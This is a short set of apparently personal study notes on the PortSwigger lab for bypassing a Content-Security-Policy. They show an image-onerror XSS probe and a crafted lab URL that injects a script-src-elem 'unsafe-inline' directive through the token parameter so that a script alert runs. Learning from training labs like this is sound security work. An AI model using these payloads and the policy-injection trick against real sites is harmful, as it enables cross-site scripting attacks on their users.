```
<img src=1 onerror=alert(1)>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3379d5ee-26db-425f-968b-b3ad450e870c)


CSP header and our alert didn’t execute
• In Burp Proxy, observe that the response contains a Content-Security-Policy header, and the report-uri directive contains a parameter called token. Because you can control the token parameter, you can inject your own CSP directives into the policy. 

From <https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ff380230-381b-4a3a-857e-c9292dfc1d5a)




```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

```
?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

From <https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass> 

We executed alert(1)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a359fbee-12b5-4a19-9151-f3faca6ce861)


